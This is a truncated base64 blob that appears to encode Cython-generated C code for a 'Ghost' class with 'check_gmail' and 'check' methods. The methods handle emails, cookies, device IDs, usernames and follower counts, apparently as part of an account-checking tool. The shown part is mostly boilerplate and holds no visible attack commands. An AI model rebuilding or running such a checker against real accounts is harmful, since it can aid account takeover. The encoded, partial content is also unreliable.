VudF9jb3VudGVyLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEzLCAoMi1fX3B5eF90XzEzKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxNzIsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgICAgfQogICAgICAgICAgX19weXhfTDU0OjsKCiAgICAgICAgICAKICAgICAgICAgIGdvdG8gX19weXhfTDUzOwogICAgICAgIH0KCiAgICAgICAgCiAgICAgICAgIHsKICAgICAgICAgIF9fcHl4X3RfNiA9IF9fcHl4X3Zfc2VsZjsKICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzYpOwogICAgICAgICAgX19weXhfdF8xMyA9IDA7CiAgICAgICAgICB7CiAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9maWx0ZXJlZH07CiAgICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbmNyZW1lbnRfY291bnRlciwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMywgKDItX19weXhfdF8xMykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxNzQsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgICAgIH0KICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgIH0KICAgICAgICBfX3B5eF9MNTM6OwoKICAgICAgICAKICAgICAgICBnb3RvIF9fcHl4X0w1MjsKICAgICAgfQoKICAgICAgCiAgICAgICB7CiAgICAgICAgX19weXhfdF82ID0gX19weXhfdl9zZWxmOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzYpOwogICAgICAgIF9fcHl4X3RfMTMgPSAwOwogICAgICAgIHsKICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iYWRfbWFpbH07CiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW5jcmVtZW50X2NvdW50ZXIsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMTMsICgyLV9fcHl4X3RfMTMpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxNzYsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgfQogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICB9CiAgICAgIF9fcHl4X0w1Mjo7CgogICAgICAKICAgIH0KICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgIGdvdG8gX19weXhfTDhfdHJ5X2VuZDsKICAgIF9fcHl4X0wzX2Vycm9yOjsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTkpOyBfX3B5eF90XzE5ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yMCk7IF9fcHl4X3RfMjAgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIxKTsgX19weXhfdF8yMSA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CgogICAgCiAgICBfX3B5eF90XzI0ID0gX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcygoKFB5T2JqZWN0ICopKCgoUHlUeXBlT2JqZWN0KilQeUV4Y19FeGNlcHRpb24pKSkpOwogICAgaWYgKF9fcHl4X3RfMjQpIHsKICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0Zi5HaG9zdC5jaGVja19nbWFpbCIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzUsICZfX3B5eF90XzYsICZfX3B5eF90XzExKSA8IDApIF9fUFlYX0VSUigwLCAxNzcsIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcikKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpOwogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNik7CiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xMSk7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzYpOwogICAgICBfX3B5eF92X2UgPSBfX3B5eF90XzY7CiAgICAgICB7CgogICAgICAgIAogICAgICAgIF9fcHl4X3RfMjEgPSBfX3B5eF92X3NlbGY7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMjEpOwogICAgICAgIF9fcHl4X3RfMTMgPSAwOwogICAgICAgIHsKICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzIxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmFkX21haWx9OwogICAgICAgICAgX19weXhfdF8xMiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbmNyZW1lbnRfY291bnRlciwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMywgKDItX19weXhfdF8xMykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yMSk7IF9fcHl4X3RfMjEgPSAwOwogICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEyKSkgX19QWVhfRVJSKDAsIDE3OSwgX19weXhfTDY1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTIpOwogICAgICAgIH0KICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwOwogICAgICB9CgogICAgICAKICAgICAgIHsKICAgICAgICB7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdl9lKTsgX19weXhfdl9lID0gMDsKICAgICAgICAgIGdvdG8gX19weXhfTDY2OwogICAgICAgIH0KICAgICAgICBfX3B5eF9MNjVfZXJyb3I6OwogICAgICAgIHsKICAgICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgICAgICAgIF9fcHl4X3RfOSA9IDA7IF9fcHl4X3RfOCA9IDA7IF9fcHl4X3RfNyA9IDA7IF9fcHl4X3RfMTAgPSAwOyBfX3B5eF90XzE0ID0gMDsgX19weXhfdF8xNSA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOSk7IF9fcHl4X3RfMTkgPSAwOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIwKTsgX19weXhfdF8yMCA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjEpOyBfX3B5eF90XzIxID0gMDsKICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25Td2FwKCZfX3B5eF90XzEwLCAmX19weXhfdF8xNCwgJl9fcHl4X3RfMTUpOwogICAgICAgICAgaWYgKCB1bmxpa2VseShfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfOSwgJl9fcHl4X3RfOCwgJl9fcHl4X3RfNykgPCAwKSkgX19QeXhfRXJyRmV0Y2goJl9fcHl4X3RfOSwgJl9fcHl4X3RfOCwgJl9fcHl4X3RfNyk7CiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOSk7CiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTApOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE0KTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNSk7CiAgICAgICAgICBfX3B5eF90XzI0ID0gX19weXhfbGluZW5vOyBfX3B5eF90XzI1ID0gX19weXhfY2xpbmVubzsgX19weXhfdF8yNiA9IF9fcHl4X2ZpbGVuYW1lOwogICAgICAgICAgewogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdl9lKTsgX19weXhfdl9lID0gMDsKICAgICAgICAgIH0KICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTApOwogICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNCk7CiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE1KTsKICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMTAsIF9fcHl4X3RfMTQsIF9fcHl4X3RfMTUpOwogICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF85KTsKICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7CiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpOwogICAgICAgICAgX19QeXhfRXJyUmVzdG9yZShfX3B5eF90XzksIF9fcHl4X3RfOCwgX19weXhfdF83KTsKICAgICAgICAgIF9fcHl4X3RfOSA9IDA7IF9fcHl4X3RfOCA9IDA7IF9fcHl4X3RfNyA9IDA7IF9fcHl4X3RfMTAgPSAwOyBfX3B5eF90XzE0ID0gMDsgX19weXhfdF8xNSA9IDA7CiAgICAgICAgICBfX3B5eF9saW5lbm8gPSBfX3B5eF90XzI0OyBfX3B5eF9jbGluZW5vID0gX19weXhfdF8yNTsgX19weXhfZmlsZW5hbWUgPSBfX3B5eF90XzI2OwogICAgICAgICAgZ290byBfX3B5eF9MNV9leGNlcHRfZXJyb3I7CiAgICAgICAgfQogICAgICAgIF9fcHl4X0w2Njo7CiAgICAgIH0KICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICBnb3RvIF9fcHl4X0w0X2V4Y2VwdGlvbl9oYW5kbGVkOwogICAgfQogICAgZ290byBfX3B5eF9MNV9leGNlcHRfZXJyb3I7CgogICAgCiAgICBfX3B5eF9MNV9leGNlcHRfZXJyb3I6OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzIsIF9fcHl4X3RfMyk7CiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yOwogICAgX19weXhfTDRfZXhjZXB0aW9uX2hhbmRsZWQ6OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzIsIF9fcHl4X3RfMyk7CiAgICBfX3B5eF9MOF90cnlfZW5kOjsKICB9CgogIAoKICAKICBfX3B5eF9yID0gUHlfTm9uZTsgX19QeXhfSU5DUkVGKFB5X05vbmUpOwogIGdvdG8gX19weXhfTDA7CiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xOSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIwKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMjEpOwogIF9fUHl4X0FkZFRyYWNlYmFjaygidGYuR2hvc3QuY2hlY2tfZ21haWwiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICBfX3B5eF9yID0gTlVMTDsKICBfX3B5eF9MMDo7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X29yaWdpbmFsX2VtYWlsKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZik7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X28pOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl90bCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2hvc3QpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9jb29raWVzKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfaGVhZGVycyk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3BhcmFtcyk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2RhdGEpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9yZXNwb25zZSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3VzZXJuYW1lKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZm9sbG93ZXJfY291bnQpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9vayk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2dnKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2VtYWlsKTsKICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKCgoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18ydGZfNUdob3N0XzE1Y2hlY2soUHlPYmplY3QgKl9fcHl4X3NlbGYsIAojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZWxzZQpQeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2VuZGlmCik7IApzdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWRlZl8ydGZfNUdob3N0XzE1Y2hlY2sgPSB7ImNoZWNrIiwgKFB5Q0Z1bmN0aW9uKSh2b2lkKCopKHZvaWQpKShfX1B5eF9QeUNGdW5jdGlvbl9GYXN0Q2FsbFdpdGhLZXl3b3JkcylfX3B5eF9wd18ydGZfNUdob3N0XzE1Y2hlY2ssIF9fUHl4X01FVEhfRkFTVENBTEx8TUVUSF9LRVlXT1JEUywgMH07CnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnRmXzVHaG9zdF8xNWNoZWNrKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCAKI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMClB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2Vsc2UKUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbmRpZgopIHsKICBQeU9iamVjdCAqX19weXhfdl9zZWxmID0gMDsKICBQeU9iamVjdCAqX19weXhfdl9lbWFpbCA9IDA7CiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTAogIENZVEhPTl9VTlVTRUQgUHlfc3NpemVfdCBfX3B5eF9uYXJnczsKICAjZW5kaWYKICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7CiAgUHlPYmplY3QqIHZhbHVlc1syXSA9IHswLDB9OwogIGludCBfX3B5eF9saW5lbm8gPSAwOwogIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDsKICBpbnQgX19weXhfY2xpbmVubyA9IDA7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSAwOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImNoZWNrICh3cmFwcGVyKSIsIDApOwogICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTEwKICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfR0VUX1NJWkUoX19weXhfYXJncyk7CiAgI2Vsc2UKICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfU2l6ZShfX3B5eF9hcmdzKTsgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzIDwgMCkpIHJldHVybiBOVUxMOwogICNlbmRpZgogICNlbmRpZgogIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoX19weXhfYXJncywgX19weXhfbmFyZ3MpOwogIHsKICAgIFB5T2JqZWN0ICoqIGNvbnN0IF9fcHl4X3B5YXJnbmFtZXNbXSA9IHsmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NlbGYsJl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9lbWFpbCwwfTsKICAgIGNvbnN0IFB5X3NzaXplX3QgX19weXhfa3dkc19sZW4gPSAoX19weXhfa3dkcykgPyBfX1B5eF9OdW1Ld2FyZ3NfRkFTVENBTEwoX19weXhfa3dkcykgOiAwOwogICAgaWYgKHVubGlrZWx5KF9fcHl4X2t3ZHNfbGVuKSA8IDApIF9fUFlYX0VSUigwLCAxODEsIF9fcHl4X0wzX2Vycm9yKQogICAgaWYgKF9fcHl4X2t3ZHNfbGVuID4gMCkgewogICAgICBzd2l0Y2ggKF9fcHl4X25hcmdzKSB7CiAgICAgICAgY2FzZSAgMjoKICAgICAgICB2YWx1ZXNbMV0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMSk7CiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMV0pKSBfX1BZWF9FUlIoMCwgMTgxLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7CiAgICAgICAgY2FzZSAgMToKICAgICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7CiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgMTgxLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7CiAgICAgICAgY2FzZSAgMDogYnJlYWs7CiAgICAgICAgZGVmYXVsdDogZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjsKICAgICAgfQogICAgICBjb25zdCBQeV9zc2l6ZV90IGt3ZF9wb3NfYXJncyA9IF9fcHl4X25hcmdzOwogICAgICBpZiAoX19QeXhfUGFyc2VLZXl3b3JkcyhfX3B5eF9rd2RzLCBfX3B5eF9rd3ZhbHVlcywgX19weXhfcHlhcmduYW1lcywgMCwgdmFsdWVzLCBrd2RfcG9zX2FyZ3MsIF9fcHl4X2t3ZHNfbGVuLCAiY2hlY2siLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE4MSwgX19weXhfTDNfZXJyb3IpCiAgICAgIGZvciAoUHlfc3NpemVfdCBpID0gX19weXhfbmFyZ3M7IGkgPCAyOyBpKyspIHsKICAgICAgICBpZiAodW5saWtlbHkoIXZhbHVlc1tpXSkpIHsgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoImNoZWNrIiwgMSwgMiwgMiwgaSk7IF9fUFlYX0VSUigwLCAxODEsIF9fcHl4X0wzX2Vycm9yKSB9CiAgICAgIH0KICAgIH0gZWxzZSBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgIT0gMikpIHsKICAgICAgZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjsKICAgIH0gZWxzZSB7CiAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTsKICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgMTgxLCBfX3B5eF9MM19lcnJvcikKICAgICAgdmFsdWVzWzFdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDEpOwogICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1sxXSkpIF9fUFlYX0VSUigwLCAxODEsIF9fcHl4X0wzX2Vycm9yKQogICAgfQogICAgX19weXhfdl9zZWxmID0gdmFsdWVzWzBdOwogICAgX19weXhfdl9lbWFpbCA9IHZhbHVlc1sxXTsKICB9CiAgZ290byBfX3B5eF9MNl9za2lwOwogIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOjsKICBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiY2hlY2siLCAxLCAyLCAyLCBfX3B5eF9uYXJncyk7IF9fUFlYX0VSUigwLCAxODEsIF9fcHl4X0wzX2Vycm9yKQogIF9fcHl4X0w2X3NraXA6OwogIGdvdG8gX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU7CiAgX19weXhfTDNfZXJyb3I6OwogIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHsKICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTsKICB9CiAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0Zi5HaG9zdC5jaGVjayIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBOVUxMOwogIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOjsKICBfX3B5eF9yID0gX19weXhfcGZfMnRmXzVHaG9zdF8xNGNoZWNrKF9fcHl4X3NlbGYsIF9fcHl4X3Zfc2VsZiwgX19weXhfdl9lbWFpbCk7CgogIAogIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHsKICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTsKICB9CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0KCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMnRmXzVHaG9zdF8xNGNoZWNrKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X2VtYWlsKSB7CiAgUHlPYmplY3QgKl9fcHl4X3ZfdWEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2RldiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfZGV2aWNlX2lkID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl91dWkgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2hlYWRlcnMgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2RhdGEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X3Jlc3BvbnNlID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl91c2VybmFtZSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfZm9sbG93ZXJfY291bnQgPSBOVUxMOwogIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3ZfZSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgUHlPYmplY3QgKl9fcHl4X3RfMSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7CiAgc2l6ZV90IF9fcHl4X3RfNzsKICBQeU9iamVjdCAqX19weXhfdF84ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF85ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xMCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzEyID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xMyA9IE5VTEw7CiAgaW50IF9fcHl4X3RfMTQ7CiAgaW50IF9fcHl4X3RfMTU7CiAgaW50IF9fcHl4X3RfMTY7CiAgY2hhciBjb25zdCAqX19weXhfdF8xNzsKICBQeU9iamVjdCAqX19weXhfdF8xOCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTkgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzIwID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8yMSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMjIgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzIzID0gTlVMTDsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJjaGVjayIsIDApOwoKICAKICB7CiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzEsICZfX3B5eF90XzIsI